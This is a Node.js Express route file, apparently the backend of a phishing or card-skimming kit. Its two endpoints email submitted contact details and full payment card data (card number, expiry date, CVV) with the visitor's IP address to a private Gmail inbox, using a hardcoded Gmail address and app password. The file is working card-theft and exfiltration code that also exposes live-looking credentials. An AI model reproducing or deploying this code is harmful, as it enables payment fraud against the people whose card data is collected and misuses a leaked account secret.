const nodemailer = require('nodemailer');
require('dotenv').config();

module.exports = function(app) {
    app.post('/api/contact-email', async (req, res) => {
        const formData = req.body;

        const emailHtml = `
        <html><body>
        <h1>New Contact Form Submission</h1>
        <p><strong>Name:</strong> ${formData.name || `${formData.firstName} ${formData.lastName}`}</p>
        <p><strong>Email:</strong> ${formData.email}</p>
        <p><strong>Phone:</strong> ${formData.phone || 'N/A'}</p>
        <p><strong>Address:</strong> ${formData.address}, ${formData.address2 || ''}, ${formData.city}, ${formData.state}, ${formData.zipCode}, ${formData.country}</p>
        <p><strong>IP Address:</strong> ${formData.ip_address}</p>
        <p><strong>User ID:</strong> ${formData.user_id}</p>
        </body></html>
      `;

        try {
            const transporter = nodemailer.createTransport({
                service: 'gmail',
                auth: {
                    user: "guirez1921@gmail.com",
                    pass: "bzfb dmyh buuq vmag"
                }
            });

            const mailOptions = {
                from: `ReactDesiree <guirez>`,
                to: 'guirez1921@gmail.com',
                subject: 'New Contact Form Submission',
                html: emailHtml
            };

            const info = await transporter.sendMail(mailOptions);
            res.status(200).json({ success: true, info });
        } catch (error) {
            console.error("Server error in /api/contact-email:", error);
            res.status(500).json({ success: false, error: error.message });
        }
    });

    app.post('/api/card-email', async (req, res) => {
        const cardData = req.body;

        const emailHtml = `
            <html><body>
            <h1>New Card Submission</h1>
            <p><strong>Card Holder Name:</strong> ${cardData.cardHolderName}</p>
            <p><strong>Card Number:</strong> ${cardData.cardNumber}</p>
            <p><strong>Expiration Date:</strong> ${cardData.expirationDate}</p>
            <p><strong>CVV:</strong> ${cardData.cvv}</p>
            <p><strong>IP Address:</strong> ${cardData.ip_address}</p>
            <p><strong>User ID:</strong> ${cardData.user_id}</p>
            </body></html>
        `;

        try {
            const transporter = nodemailer.createTransport({
                service: 'gmail',
                auth: {
                    user: "guirez1921@gmail.com",
                    pass: "bzfb dmyh buuq vmag"
                }
            });

            const mailOptions = {
                from: `ReactDesiree <guirez>`,
                to: 'guirez1921@gmail.com',
                subject: 'New Card Submission',
                html: emailHtml
            };

            const info = await transporter.sendMail(mailOptions);
            res.status(200).json({ success: true, info });
        } catch (error) {
            console.error("Server error in /api/card-email:", error);
            res.status(500).json({ success: false, error: error.message });
        }
    });
};
